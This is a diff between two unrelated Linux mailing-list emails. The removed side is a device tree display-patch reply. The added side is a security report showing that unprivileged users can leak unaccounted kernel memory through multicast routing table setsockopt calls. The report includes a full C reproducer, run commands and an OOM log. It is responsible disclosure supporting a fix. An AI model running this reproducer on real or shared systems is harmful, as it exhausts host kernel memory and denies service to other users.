@@ -1,158 +1,371 @@
-Received: from mail-yx1-f43.google.com (mail-yx1-f43.google.com [74.125.224.43])
+Received: from mail-pf1-f173.google.com (mail-pf1-f173.google.com [209.85.210.173])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CC2F240BCBC
-	for <linux-kernel@vger.kernel.org>; Tue,  8 Sep 2026 11:58:48 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.224.43
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4A01151D526
+	for <linux-kernel@vger.kernel.org>; Tue,  8 Sep 2026 11:58:47 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.173
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788868730; cv=none; b=nekWlwTY+RDpkZAiO//B2qJ/RQt2l8lnsQl9prYu6kBTmYnwjyHkHuSiGiDfUsRbUCPhjZSRgxyyqMyU8NjYTQQ0kChnrEhejcRFGhyiLysqt+AShov/E28GSNt/tGCIFapQoGDzcpZPyoB1V31uHTLuCx6JgP3TK+MDH4KCM8I=
+	t=1788868729; cv=none; b=WkAoT83MlIJk5WRhtoexIlS4AVnKWzO82zrWdu5KjdDd35Hoqe82UfCZMWi4bmJoMcn3Oi9JC9SsVdJ9zQQmBogTrqsUJHFLO7acEUbn42cZNeFcQ8tcqPQSwuJxK/V5HgJZisBJ0TrVTiH2cIk5z7EOdyn5uP+fGpj2RY5h8Go=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788868730; c=relaxed/simple;
-	bh=9mLInqnl0A4PpEzjATNo/tTkIoqMFHl/SuK3vHw1/6M=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=SUdn6X9U6kRd/gM9Owq6jOQwtDQRB6QscRLlt7J3x+URSmUQXrPBsGGrerIYVon6Xr8eOJh6sATQzhoOBF4RhvH6XSufnemTNUOqpu5atQjhc9q/nzceY3UuEvT+1eqbuFmC+fk63yzbK9RBWvpFnylkYdlYqcghg7WyY5DN3ow=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=aIFCv6P8; arc=none smtp.client-ip=74.125.224.43
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1788868729; c=relaxed/simple;
+	bh=Cg96fz9AMvtr690gtriHj2jC461D9RfPJPbSaq4r+jE=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=AafSnAZX4eIexS80RI26HCHuMAA2OedNd4of2wMYjDwL1ZVO/AbXun98v/Qimv0P9uQfXl412u5d7nh9WwcUpYKVPqUGLDg5p+Zq6Cmsme3t7hBVo9MrubPIXPVOAb+P62/3PDZpzr4IdxHGjSGdiLAyD5SIPQcImFxrbCKlFjI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=fRff7hZb; arc=none smtp.client-ip=209.85.210.173
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="aIFCv6P8"
-Received: by mail-yx1-f43.google.com with SMTP id 956f58d0204a3-66d9f9d8384so1447464d50.0
-        for <linux-kernel@vger.kernel.org>; Tue, 08 Sep 2026 04:58:48 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="fRff7hZb"
+Received: by mail-pf1-f173.google.com with SMTP id d2e1a72fcca58-85c9a79590aso4274187b3a.1
+        for <linux-kernel@vger.kernel.org>; Tue, 08 Sep 2026 04:58:47 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1788868728; x=1789473528; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=5YSbpx2/giMWiDN23LuZeurQee/vaO9NMucSm/vs5YM=;
-        b=aIFCv6P8aiQXIWJOjZP5dtyEiGA8isLyjLM4tPwxHTOJkU/uyjqL8D3JVc51QpJLnA
-         wxKxWApr99vB2THgvgL/3wC48TxH95YPqFsbljsBHwoNZ8awVWspHzMuZIoZNiaMBOaI
-         xW91ouqG3YcDxQzhegYK8J2/SsUpBR141zbZj6n8LHA1KEMP4V3Nb1MehFCaO4Kyh8ob
-         12Cp5m7g7yR/xPvmf5+PHa6KEHUY2jKbSRHsrufA+VkeJdH8E13wxx0DO4KtEr8XSZMM
-         LQTo1RmRWaYQcGKuV+JRR8a0RC5IH6GiiqbOljaHTJCz/NYF97wmB7KSffvr1I8nuhjY
-         nGQg==
+        d=nebusec.ai; s=google; t=1788868726; x=1789473526; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=6vvQft8bSZBbRshI3SXx0bNRZA/7aUi7EgN3zlxGD64=;
+        b=fRff7hZbHtpuOYTbXMo8nZzSP/xAuIBJ+jdNapSnrQY/uGuIlzZ/EGfZOh1ZWVSZgJ
+         QSbHlwqom634NvtA+bOyC1McnV4/RsT2Zbk/dhmdMLblwatZMmYyrjH0Zgw3SkHOvOCV
+         BlNKivk3XmOUfY/Gcok+d2QMFOVZBogSCyQTSNESf6R9MP+/1jA1Ffv+XtwVG1N3rKEW
+         aQVVrEOnYF66INm17kOWtft2y4cTncLSwmGCFdPH3I5UYGAPHXrpOe37dfN999QqR+bs
+         ef2uJPFuQ1aGzdkFaqy74rw1cTxHMtNEYg1+eLkKFKwCQpXCMqC+KIoq0lKAaRdiLINE
+         I5PQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1788868728; x=1789473528;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=5YSbpx2/giMWiDN23LuZeurQee/vaO9NMucSm/vs5YM=;
-        b=pI8R6jfYsHioyzsnSOAJB/Zfp20lSXEu5q5QdcleuLB0k8c8dZ5Znjm9hbGla0HpTg
-         EmMSflax7PaUlwigbTi8wkMcEYZ8THgQR6eRafA7O5eP5NSUBr86YxFGUnyPS+SCPC8D
-         EAubphfhoi/yzoVK4ssV0ujVCTrkGXgeZuvI7jzXjCFtN6tA7AK5ZE5xvwuEkAEarAT8
-         XItLG9Smu60lMrvE8Jt/HWBEkuSJsVnggmUq76lElQNgT8ufBYVr67pSDD7CTxucm2CI
-         WwHy2nwNt5uRWYDGugDyXunms1WSw+SFHmGtgYsZfSOIhZnLB4lTvjXcT5zxr+gXOM7X
-         RM5A==
-X-Forwarded-Encrypted: i=1; AKwUvByqnUdVMrfrmW4rnftqZpYGogXbWmJkNkaH5jnXBEDv2I22Yi/+yOH0eoTZY/+P7ZQBkOcCSC1PTGQ1NnA=@vger.kernel.org
-X-Gm-Message-State: AFuF++kHPpN7Lqzolw/OtNxGCJlu9ynxKuc33pXa8voCJpaIW5z6uQtZ
-	Vmzltiqp9300r6XRTRpXAW/DHUnAA3Urj+7dqjVORbyleea6SPQVJLC4
-X-Gm-Gg: AYBFou2hE8Dt0oRVeAOVmMiyjzvOVSDrr8+eqnbVrmW6HXl0V2flYzr+fWFIRJwnQtS
-	gJ7nxqoErrLkYz2J7k8Q/PnAKb5JdnOUL5L/RKelbp/t04L+TRK1lxP+AuGeDl1duewYdzpVSsE
-	n1pTPL2qUzWod8sSeZCdj6PaETYV+VOzb2UpUOUtpVW8InqJTzcD7FX2C3FmD2t7Gp9Og4r2Dr3
-	0bJWvhVduiZf1CE/Ttc6DI15cseeo1WKw3WzJhQKsw11/oN8ROf+fTei94MuB8EfGmMWRGRTCRn
-	YgFHoIJsO+EzrollQwmNDMVb+r6o6k2QrQp/z0dL+3GnGz+3dxmb7vw3kcPiFRGZ34U9tlNzLhm
-	zI9Np0dbsOHjlNlbaTaatU67uxLsdnIXpuynsz9TtW2N+jrYebCFADrq1PTA8Wm1Umjw6nYvFB9
-	hG1KutZA/8jbAdqSUdVRk/nyHluyJh+Fd1lzUuc1ETqTfUIyhccG7LyPC4iKGJk1/yP/xBhk8L9
-	t/pog==
-X-Received: by 2002:a05:690e:13cd:b0:66f:c284:47ff with SMTP id 956f58d0204a3-66fc2845290mr5848557d50.62.1788868727460;
-        Tue, 08 Sep 2026 04:58:47 -0700 (PDT)
-Received: from leonardoc-nb ([67.159.246.222])
-        by smtp.gmail.com with ESMTPSA id 956f58d0204a3-66fb495eccesm9958264d50.18.2026.09.08.04.58.43
+        d=1e100.net; s=20251104; t=1788868726; x=1789473526;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=6vvQft8bSZBbRshI3SXx0bNRZA/7aUi7EgN3zlxGD64=;
+        b=AAWvLkbg/clvG5ugy9SCAlXSQM2UNRNwij4u1Hwv8egQbavVygpvZOB2NkInwAOFxF
+         qKnl3VryKV/7FTb+88ygt6u1sF6cZ5MAAlboCAncS5A2cnROaR+TpymWoZhRBpHFOOTy
+         bEE++NCHfTxpAhUCWYjgF7EPWyLz8/oovGLBoIVTX3E4SZHJa3kWzWhuFoToLU++lXgJ
+         //Cu2jmIOanBoYUnFSg6Ldclq4EXuMdMyUs5wrR5h+yfam4DCfUjzm48Qw7RItVHRQ9G
+         NoP3zqehCqzF2hKjJs04q+owwgQ76kTMbSmWHdFdUoL0Ult2oNUMgOuQvkXcuu9ftOgy
+         cz9g==
+X-Forwarded-Encrypted: i=1; AKwUvBwpf4aDSVj3J+j/YaDkOSbxT06AHMra1j03V8jU5TTZd/rbUJVhXdrSzMOuuKe/lH/63icfncKhvNXAk6Q=@vger.kernel.org
+X-Gm-Message-State: AFuF++m2LiB83TdzuEV/Va1C67ga7CJrVZBMEt3rQ9mtcHPoHcw4fSsM
+	6K0nkEMw7iOE0z3YqzAdXElLxrtpFtIUwyLj34f4a1EwL1wnChNnbg4s7/RPt5V1s8GI
+X-Gm-Gg: AYBFou1KghkRQRoxqi+1G0ZGUrsGYixm7leGbH5xJfBwX2jXqF7jvU9xaxFCycV7Q9C
+	1oRuOHM2zzlUkyfPrKzSq+tty8bh0ThGWOVrhukoSMbdJhHdmPIIUJO/6vkNZtKBQ5jAxeqCB3U
+	pTGvmpMy7knA92AI7wLGIlY5a6irkaT3ZeOxpl14/y5HbFHujjr7mAIH9zUi+iTvOLiYUu+jd+Y
+	knK6rdN2PzF7pE7aYmSsZygfXMd72RtxnkRKGvXuNPFLvB4m+DaQ0KkqCjrKK0LFPfIIJ82MNCF
+	KnL1xInngUOwMuL/G7q1TSm171ZHzsr+27pNYiCXUoFUHAzLgmjZTGQOGWNcsd7+GBwCE0uUIPq
+	VlvYyxVSe3Q6rUpP+KFPOkqiud0P2CGXJ4UtlhehpGJAblSkZfPfMDfQM8mER7xXwKr9+pg8NPI
+	xJRE2DvLZgb/QPS9/ytNoZ15RW12ztJoVBjqL5zIttWL32e972QKnp0wCq8GR3eEgBRU86HbKWo
+	3DJvSCmJwutFpwhpOI=
+X-Received: by 2002:a05:6a00:238c:b0:857:7337:5dbc with SMTP id d2e1a72fcca58-8616b767b9emr39433661b3a.26.1788868726368;
+        Tue, 08 Sep 2026 04:58:46 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-863884ff3c9sm3512837b3a.42.2026.09.08.04.58.42
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Tue, 08 Sep 2026 04:58:47 -0700 (PDT)
-Date: Tue, 8 Sep 2026 08:58:40 -0300
-From: Leonardo Costa <leoreis.costa@gmail.com>
-To: "Kumar, Udit" <u-kumar1@ti.com>
-Cc: nm@ti.com, vigneshr@ti.com, kristo@kernel.org, robh@kernel.org, 
-	krzk+dt@kernel.org, conor+dt@kernel.org, linux-arm-kernel@lists.infradead.org, 
-	devicetree@vger.kernel.org, linux-kernel@vger.kernel.org, 
-	Leonardo Costa <leonardo.costa@toradex.com>
-Subject: Re: [PATCH 1/1] arm64: dts: ti: k3-am69-aquila: Add Toradex DSI to
- LVDS adapter with the 10.1" V2 display
-Message-ID: <ugxocb3gmyhjefptdvsqtv2ebsngcr2ol4rfuwv4exukqd6lxs@yuema6b7ikgv>
-References: <20260803173705.2268792-1-leoreis.costa@gmail.com>
- <20260803173705.2268792-2-leoreis.costa@gmail.com>
- <29aaa2ec-c1fe-4f60-a6d1-f8c797587986@ti.com>
- <kumbe27i7a632rthuruthpt6z65aszivylj2u7cdkeqecx3zgd@vi27clpphsq3>
+        Tue, 08 Sep 2026 04:58:45 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org,
+	David Ahern <dsahern@kernel.org>,
+	Ido Schimmel <idosch@nvidia.com>
+Cc: "David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	Patrick McHardy <kaber@trash.net>,
+	linux-kernel@vger.kernel.org,
+	Zihan Xi <zihanx@nebusec.ai>
+Subject: [PATCH net v4 0/1] ipmr: unaccounted multicast table memory
+Date: Tue,  8 Sep 2026 11:58:38 +0000
+Message-ID: <cover.1788784801.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <kumbe27i7a632rthuruthpt6z65aszivylj2u7cdkeqecx3zgd@vi27clpphsq3>
+Content-Transfer-Encoding: 8bit
 
-On Tue, Sep 08, 2026 at 08:17:57AM -0300, Leonardo Costa wrote:
-> Hi Udit,
-> 
-> On Sun, Sep 06, 2026 at 10:49:52AM +0530, Kumar, Udit wrote:
-> > Hi Leonardo
-> > 
-> > On 8/3/2026 11:04 PM, Leonardo Costa wrote:
-> > > From: Leonardo Costa <leonardo.costa@toradex.com>
-> > > 
-> > > Add a device tree overlay for the Toradex DSI to LVDS Adapter with the
-> > > Toradex Capacitive Touch Display 10.1" LVDS V2. The adapter connects to the
-> > > Aquila DSI_1 interface. It is based on the Texas Instruments SN65DSI84
-> > > DSI-to-LVDS bridge and drives an Opto Logic SCX1001511GGC49 10.1" WXGA TFT
-> > > LCD LVDS panel. Touch input is provided by an ILITEK ILI251x capacitive
-> > > touch controller.
-> > > 
-> > > Link: https://developer.toradex.com/hardware/accessories/add-ons/dsi-lvds-adapter
-> > > Link: https://developer.toradex.com/hardware/accessories/displays/capacitive-touch-display-101inch-lvds
-> > > Signed-off-by: Leonardo Costa <leonardo.costa@toradex.com>
-> > > ---
-> > >  arch/arm64/boot/dts/ti/Makefile               |   5 +
-> > >  ...dsi-to-lvds-v2-panel-cap-touch-10inch.dtso | 153 ++++++++++++++++++
-> > >  2 files changed, 158 insertions(+)
-> > >  create mode 100644 arch/arm64/boot/dts/ti/k3-am69-aquila-dsi-to-lvds-v2-panel-cap-touch-10inch.dtso
-> > > 
-> > > diff --git a/arch/arm64/boot/dts/ti/Makefile b/arch/arm64/boot/dts/ti/Makefile
-> > > index f4d109ef6798a..8a59fc597aede 100644
-> > > --- a/arch/arm64/boot/dts/ti/Makefile
-> > > +++ b/arch/arm64/boot/dts/ti/Makefile
-> > > @@ -218,6 +218,7 @@ dtb-$(CONFIG_ARCH_K3) += k3-am69-aquila-dev.dtb
-> > > [..]
-> > > +
-> > > +	panel-lvds-bridge {
-> > > +		compatible = "optologic,scx1001511ggc49", "panel-lvds";
-> > 
-> > > +		backlight = <&backlight_pwm3>;
-> > > +		data-mapping = "vesa-24";
-> > > +		height-mm = <136>;
-> > > +		width-mm = <217>;
-> > > +
-> > > +		panel-timing {
-> > > +			clock-frequency = <70000000>;
-> > 
-> > Looking at
-> > https://lore.kernel.org/linux-arm-kernel/20260623195741.495734-1-leoreis.costa@gmail.com/T/#mc4ed25e5253da6dc635fd3eddc317dac8f447f3e
-> > 
-> > 
-> > you are using three different clock-freq 69500000, 64500000 and
-> > 70000000 here.
-> > Could add some comment here, why freq is adjusted.
-> 
-> It's for the same reason as the 69500000 clock frequency in the Verdin
-> AM62 patch. In general the DSI to LVDS bridge requires longer horizontal
-> porch and sync values than the typical values for the display, and we
-> intend to use the values on this patch in the general case when the
-> bridge is used. The reason why the frequency here (70000000) is
-> different from the Verdin AM62 one (69500000) is because we found that
-> that 70000000, along with the other timing values, work more
-> consistently with the bridge across our modules, the ones on the Verdin
-> AM62 ended up being a first iteration.
-> 
-> I'll add a comment explaining the difference from the native LVDS values
-> in the v2 patch.
+Hi Linux kernel maintainers,
 
-Correcting my last reply:
+We found and validated a issue in net/ipv6/ip6mr.c. The bug is
+reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-The 69500000 frequency and other timings were used on Verdin AM62 were
-due to the DPI->DSI bridge used on the module, not only due to the DSI
-to LVDS bridge that can be attached to the carrier boards. Ever since
-that, we found that the DSI to LVDS bridge itself generally also needs
-higher values to work consistently across our modules, compared to the
-ones typical for the display.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+
+---- details below ----
+
+Bug details:
+
+MRT_TABLE and MRT6_TABLE are supposed to select a multicast routing
+table id. For every unseen id, ip_mroute_setsockopt() and
+ip6_mroute_setsockopt() call the shared mr_table_alloc() helper,
+which links the new mr_table into the per-net list. The table stays
+allocated until the net namespace is torn down and was not charged
+to memcg.
+
+A raw ICMP or ICMPv6 socket created after unshare -Urn therefore has
+CAP_NET_ADMIN/CAP_NET_RAW in that namespace. It can loop
+MRT_TABLE or MRT6_TABLE with a fresh id, close the socket, and still
+leave the tables allocated.
+
+On an unfixed 7.3.0-rc1 kernel in a 2 vCPU, 2 GB QEMU VM, the IPv6
+reproducer ./poc 30000 1 grew Slab from 27644 kB to 150412 kB and
+SUnreclaim from 19804 kB to 142552 kB. setsockopt() still returned
+0; that run did not panic or OOM the host. The same unfixed kernel
+under a 64M memory.max also finished with RET:0, because the tables
+were not charged to memcg (memory.current stayed about 414 kB).
+There is no KASAN stack to decode for the unfixed growth.
+
+User space can create these extra tables after commit f0ad0860d01e
+("ipv4: ipmr: support multiple tables") and commit d1db275dd3f6
+("ipv6: ip6mr: support multiple tables"). The reproducer depends on
+that multi-table path, so Fixes: points at those commits.
+
+The established way to bound this class of per-netns object is memcg
+accounting, as done for IP addresses, routes and alternate interface
+names. The patch charges mr_table with GFP_KERNEL_ACCOUNT and marks
+the IPv4/IPv6 MFC caches SLAB_ACCOUNT. Unresolved MFC entries stay
+GFP_ATOMIC and are not charged; they expire after 10 seconds and are
+bounded by the mrouted socket receive queue. With a memory.max limit
+on the container, further table allocations fail and the allocating
+process is OOM-killed instead of growing unaccounted host slab.
+
+The pasted reproducer is the IPv6 MRT6_TABLE loop. It does not cover
+MRT6_ADD_MFC or IPv4 MRT_TABLE. The OOM log below is from the same
+PoC after the accounting patch, running as poc.static under a 64M
+memory.max.
+
+The leak is a setsockopt accounting bug, not a packet-sequence bug, so
+the reproducer is a raw ICMPv6 socket program rather than packetdrill.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+The in-guest binary was named poc.static. Unfixed Slab growth used
+unshare -Urn ./poc.static 30000 1. The decoded OOM log used:
+
+    echo +memory > /sys/fs/cgroup/cgroup.subtree_control
+    mkdir /sys/fs/cgroup/mrtest
+    echo 64M > /sys/fs/cgroup/mrtest/memory.max
+    bash -c 'echo $$ > /sys/fs/cgroup/mrtest/cgroup.procs; exec unshare -Urn ./poc.static 30000 1'
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/mroute6.h>
+#include <netinet/icmp6.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(1);
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"Usage: %s [count] [start_table]\n"
+		"  count: number of new MRT6 table ids to allocate (default: 200000)\n"
+		"  start_table: first table id to use (default: 1)\n",
+		prog);
+	exit(1);
+}
+
+int main(int argc, char **argv)
+{
+	unsigned int count = 200000;
+	unsigned int start = 1;
+	unsigned int i;
+	int fd;
+
+	if (argc > 3)
+		usage(argv[0]);
+	if (argc >= 2)
+		count = strtoul(argv[1], NULL, 0);
+	if (argc == 3)
+		start = strtoul(argv[2], NULL, 0);
+
+	if (count == 0 || start == 0 || start >= 100000000U)
+		usage(argv[0]);
+
+	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
+	if (fd < 0)
+		die("socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)");
+
+	for (i = 0; i < count; i++) {
+		u_int32_t table = start + i;
+
+		if (table >= 100000000U) {
+			fprintf(stderr, "stopped before invalid table id %u\n", table);
+			break;
+		}
+
+		if (setsockopt(fd, IPPROTO_IPV6, MRT6_TABLE, &table,
+			       sizeof(table)) < 0) {
+			fprintf(stderr,
+				"setsockopt(MRT6_TABLE, %u) failed after %u allocations: %s\n",
+				table, i, strerror(errno));
+			close(fd);
+			return 2;
+		}
+
+		if ((i % 10000) == 0) {
+			struct rusage ru;
+
+			if (!getrusage(RUSAGE_SELF, &ru))
+				fprintf(stderr,
+					"allocated=%u current_table=%u maxrss_kb=%ld\n",
+					i + 1, table, ru.ru_maxrss);
+			else
+				fprintf(stderr, "allocated=%u current_table=%u\n",
+					i + 1, table);
+		}
+	}
+
+		fprintf(stderr,
+			"done: allocated %u tables on one socket without MRT6_INIT; closing socket now\n",
+			i);
+	close(fd);
+	sleep(2);
+	fprintf(stderr, "socket closed; tables persist until netns teardown\n");
+	return 0;
+}
+------END poc.c--------
+
+----BEGIN crash log----
+poc.static invoked oom-killer: gfp_mask=0x400dc0(GFP_KERNEL_ACCOUNT|__GFP_ZERO), order=1, oom_score_adj=0
+[   65.587658] CPU: 1 UID: 0 PID: 294 Comm: poc.static Not tainted 7.3.0-rc1-00241-gd995bc728c32 #3 PREEMPT(lazy)
+[   65.587664] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   65.587665] Call Trace:
+[   65.587698]  <TASK>
+[   65.587699]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
+[   65.587718]  dump_header (mm/oom_kill.c:464)
+[   65.587720]  oom_kill_process (mm/oom_kill.c:1031)
+[   65.587721]  out_of_memory (mm/oom_kill.c:1169 (discriminator 4))
+[   65.587723]  mem_cgroup_out_of_memory (mm/memcontrol.c:1952)
+[   65.587725]  try_charge_memcg (mm/memcontrol.c:1975 mm/memcontrol.c:2760)
+[   65.587727]  __memcg_slab_post_alloc_hook (mm/memcontrol.c:3161 mm/memcontrol.c:3539 mm/memcontrol.c:3669)
+[   65.587728]  ? __pfx_ip6mr_new_table_set (net/ipv6/ip6mr.c:379)
+[   65.587731]  __kmalloc_cache_noprof (mm/slub.c:2517 mm/slub.c:4702 mm/slub.c:4996 mm/slub.c:5559)
+[   65.587733]  ? mr_table_alloc (include/linux/slab.h:991 include/linux/slab.h:1312 net/ipv4/ipmr_base.c:55)
+[   65.587734]  mr_table_alloc (include/linux/slab.h:991 include/linux/slab.h:1312 net/ipv4/ipmr_base.c:55)
+[   65.587736]  ? __pfx_ipmr_expire_process (net/ipv4/ipmr.c:3339)
+[   65.587737]  ip6_mroute_setsockopt (net/ipv6/ip6mr.c:416 net/ipv6/ip6mr.c:408 net/ipv6/ip6mr.c:1873)
+[   65.587739]  ? update_cfs_rq_load_avg (kernel/sched/fair.c:5687)
+[   65.587742]  ? kvm_clock_get_cycles (arch/x86/kernel/kvmclock.c:80 (discriminator 1) arch/x86/kernel/kvmclock.c:87 (discriminator 1))
+[   65.587743]  ? ktime_get (kernel/time/timekeeping.c:304 kernel/time/timekeeping.c:482 kernel/time/timekeeping.c:1004)
+[   65.587746]  ? clockevents_program_event (kernel/time/clockevents.c:372)
+[   65.587747]  do_ipv6_setsockopt (net/ipv6/ipv6_sockglue.c:397)
+[   65.587750]  ? __cgroup_account_cputime (kernel/cgroup/rstat.c:626 (discriminator 10) kernel/cgroup/rstat.c:637 (discriminator 10))
+[   65.587752]  ? update_se (include/linux/cgroup.h:877 kernel/sched/fair.c:1421)
+[   65.587753]  ? avc_has_perm (include/linux/rcupdate.h:882 security/selinux/avc.c:1164 security/selinux/avc.c:1194)
+[   65.587755]  ? pick_eevdf (kernel/sched/fair.c:969 kernel/sched/fair.c:1208)
+[   65.587757]  ? sock_has_perm (security/selinux/hooks.c:4932 (discriminator 1))
+[   65.587758]  ipv6_setsockopt (net/ipv6/ipv6_sockglue.c:965)
+[   65.587760]  do_sock_setsockopt (net/socket.c:2397)
+[   65.587777]  __sys_setsockopt (net/socket.c:2422)
+[   65.587779]  __x64_sys_setsockopt (net/socket.c:2428 net/socket.c:2425 net/socket.c:2425)
+[   65.587780]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[   65.587783]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[   65.587784] RIP: 0033:0x41d58e
+[   65.587786] Code: bc c5 c1 e0 1a 0d 00 00 04 00 89 01 e9 c1 fe ff ff e8 36 02 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 c0
+[   65.587787] RSP: 002b:00007ffe3f28f9c8 EFLAGS: 00000297 ORIG_RAX: 0000000000000036
+[   65.587789] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000041d58e
+[   65.587790] RDX: 00000000000000d1 RSI: 0000000000000029 RDI: 0000000000000003
+[   65.587790] RBP: 0000000000000001 R08: 0000000000000004 R09: 0000000000000000
+[   65.587791] R10: 00007ffe3f28f9ec R11: 0000000000000297 R12: 0000000005f5e0ff
+[   65.587792] R13: 0000000000007530 R14: 0000000000003fb0 R15: 00000000d1b71759
+[   65.587793]  </TASK>
+[   65.587803] memory: usage 65536kB, limit 65536kB, failcnt 21
+[   65.587809] swap: usage 0kB, limit 9007199254740988kB, failcnt 0
+[   65.587814] Memory cgroup stats for /mrtest:
+[   65.587846] anon 49152
+[   65.587851] file 0
+[   65.587856] kernel 67059712
+[   65.587862] kernel_stack 0
+[   65.587867] pagetables 45056
+[   65.587872] sec_pagetables 0
+[   65.587877] percpu 1280
+[   65.587882] sock 0
+[   65.587887] vmalloc 0
+[   65.587892] shmem 0
+[   65.587897] file_mapped 0
+[   65.587902] file_dirty 0
+[   65.587907] file_writeback 0
+[   65.587912] swapcached 0
+[   65.587917] inactive_anon 45056
+[   65.587940] active_anon 4096
+[   65.587946] inactive_file 0
+[   65.587951] active_file 0
+[   65.587956] unevictable 0
+[   65.587961] slab_reclaimable 13600
+[   65.587966] slab_unreclaimable 66997016
+[   65.587971] slab 67010616
+[   65.587977] workingset_refault_anon 0
+[   65.587978] workingset_refault_file 0
+[   65.587978] workingset_activate_anon 0
+[   65.587978] workingset_activate_file 0
+[   65.587978] workingset_restore_anon 0
+[   65.587979] workingset_restore_file 0
+[   65.587979] workingset_nodereclaim 0
+[   65.587979] pgdemote_kswapd 0
+[   65.587979] pgdemote_direct 0
+[   65.587980] pgdemote_khugepaged 0
+[   65.587980] pgdemote_proactive 0
+[   65.587980] pgsteal_kswapd 0
+[   65.587980] pgsteal_direct 12
+[   65.587981] pgsteal_khugepaged 0
+[   65.587981] pgsteal_proactive 0
+[   65.587981] pgscan_kswapd 0
+[   65.587981] pgscan_direct 12
+[   65.587981] pgscan_khugepaged 0
+[   65.587982] pgscan_proactive 0
+[   65.587982] pgrefill 1
+[   65.587982] pgscan 12
+[   65.587982] pgsteal 12
+[   65.587983] pswpin 0
+[   65.587983] pswpout 0
+[   65.587983] pgfault 108
+[   65.587983] pgmajfault 1
+[   65.587983] pgactivate 1
